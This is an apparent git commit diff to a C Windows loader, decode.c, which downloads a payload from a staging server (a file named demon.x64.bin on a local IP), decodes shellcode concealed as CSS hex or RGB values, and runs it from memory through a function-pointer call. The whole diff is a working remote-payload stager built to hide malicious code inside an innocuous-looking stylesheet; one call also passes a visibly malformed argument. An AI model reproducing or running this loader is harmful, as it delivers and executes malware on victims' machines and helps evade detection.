14c6b40ac280661f48c2221b7dd6126a53b52222
inb1ts <inbits@protonmail.com>
2023-09-05 11:45:50 +0100

    Update decode to fetch css file from staging

--- example_decode/C/decode.c
+++ example_decode/C/decode.c
@@ -1,5 +1,9 @@
 #include <Windows.h>
 #include <stdio.h>
+#include <wininet.h>
+#pragma comment(lib, "wininet.lib");
+
+#define STAGINGURL L"http://192.168.56.130:8080/demon.x64.bin"
 
 BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
     BYTE * payload = NULL;
@@ -76,47 +80,101 @@ BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPaylo
     return TRUE;
 }
 
+BOOL FetchCSS(WCHAR * url, BYTE ** cssFile, SIZE_T * cssFileSize) {
+    BOOL state = TRUE;
+    HINTERNET hInt = NULL;
+    HINTERNET hIntFile = NULL;
+    DWORD dwBytesRead = 0;
+    SIZE_T sSize = NULL;
+    BYTE * pBytes = NULL;
+    BYTE * pTmpBytes = NULL;
+
+    hInt = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
+	if (hInt == NULL) {
+		printf("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
+        state = FALSE;
+        goto _EndOfFunction;
+	}
+
+    hIntFile = InternetOpenUrlW(hInt, url, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	if (hIntFile == NULL) {
+		printf("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
+        state = FALSE;
+        goto _EndOfFunction;
+	}
+
+    pTmpBytes = LocalAlloc(LPTR, 1024);
+    if (pTmpBytes == NULL) {
+        state = FALSE;
+        goto _EndOfFunction;
+    }
+
+    while(TRUE) {
+        if (!InternetReadFile(hIntFile, pTmpBytes, 1024, &dwBytesRead)) {
+            printf("Error calling InternetReadFile: %d\n", GetLastError());
+            state = FALSE;
+            goto _EndOfFunction;
+        }
+
+        sSize += dwBytesRead;
+
+        if (pBytes == NULL) {
+            pBytes = LocalAlloc(LPTR, dwBytesRead);
+        } else {
+            pBytes = LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE|LMEM_ZEROINIT);
+        }
+
+        memcpy((VOID *)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+
+        memset(pTmpBytes, '\0', dwBytesRead);
+
+        if (dwBytesRead < 1024) {
+            break;
+        }
+    }
+
+	*cssFile = pBytes;
+	*cssFileSize = sSize;
+    
+_EndOfFunction:
+	if (hInt) InternetCloseHandle(hInt);
+	if (hIntFile) InternetCloseHandle(hIntFile);
+	if (hInt) InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+	if (pTmpBytes) LocalFree(pTmpBytes);
+
+    return state;
+}
+
 int main(void) {
-    HANDLE hFile = NULL;
+    BYTE * cssFile = NULL;
+    SIZE_T cssFileSize = 0;
     BYTE * decodedPayload = NULL;
     BYTE * encodedPayloadBuf = NULL;
-    LARGE_INTEGER fileSize = { 0 };
     DWORD bytesRead = NULL;
     SIZE_T decodedPayloadSize = 0;
     DWORD oldProt = NULL;
 
-    hFile = CreateFileA("..\\..\\style.css", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-	if (hFile == INVALID_HANDLE_VALUE) {
-		printf("[!] CreateFileA Failed With Error : %d \n", GetLastError());
-        goto _EndOfFunc;
-	}
-
-    if (GetFileSizeEx(hFile, &fileSize) == 0) {
-        printf("[!] Error calling GetFileSizeEx: %d\n", GetLastError());
+    if (!FetchCSS(STAGINGURL, &cssFile, &cssFileSize || cssFileSize == 0)) {
+        printf("[!] Error fetching CSS file.\n");
         goto _EndOfFunc;
     }
 
-    encodedPayloadBuf = (BYTE *) VirtualAlloc(NULL, fileSize.LowPart, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    encodedPayloadBuf = (BYTE *) VirtualAlloc(NULL, cssFileSize, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!encodedPayloadBuf) {
         printf("[!] Error calling VirtualAlloc: %d\n", GetLastError());
         goto _EndOfFunc;
     }
 
-    if (!ReadFile(hFile, encodedPayloadBuf, fileSize.LowPart, &bytesRead, NULL)) {
-        printf("[!] Error calling ReadFile: %d\n", GetLastError());
-        goto _EndOfFunc;
-    }
-
+    RtlMoveMemory(encodedPayloadBuf, cssFile, cssFileSize);
 
     // Uncomment and comment above to use Hex version    
-    // if (!DecodeCssHex(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+    // if (!DecodeCssHex(encodedPayloadBuf, cssFileSize, &decodedPayload, &decodedPayloadSize)) {
     //     printf("[!] Error decoding CSS payload\n");
     //     goto _EndOfFunc;
     // }
 
-
     // Uncomment and comment above to use Hex version
-    if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+    if (!DecodeCssRbg(encodedPayloadBuf, cssFileSize, &decodedPayload, &decodedPayloadSize)) {
         printf("[!] Error decoding CSS payload\n");
         goto _EndOfFunc;
     }
@@ -124,9 +182,9 @@ int main(void) {
     (*(VOID(*)()) decodedPayload)();
 
 _EndOfFunc:
-    if (hFile) CloseHandle(hFile);
-    if (encodedPayloadBuf) VirtualFree(encodedPayloadBuf, fileSize.LowPart, MEM_RELEASE);
-    if (decodedPayload) VirtualFree(decodedPayload, fileSize.LowPart, MEM_RELEASE);
+    if (cssFile) LocalFree(cssFile);
+    if (encodedPayloadBuf) VirtualFree(encodedPayloadBuf, cssFileSize, MEM_RELEASE);
+    if (decodedPayload) VirtualFree(decodedPayload, cssFileSize, MEM_RELEASE);
 
     return 0;
 }
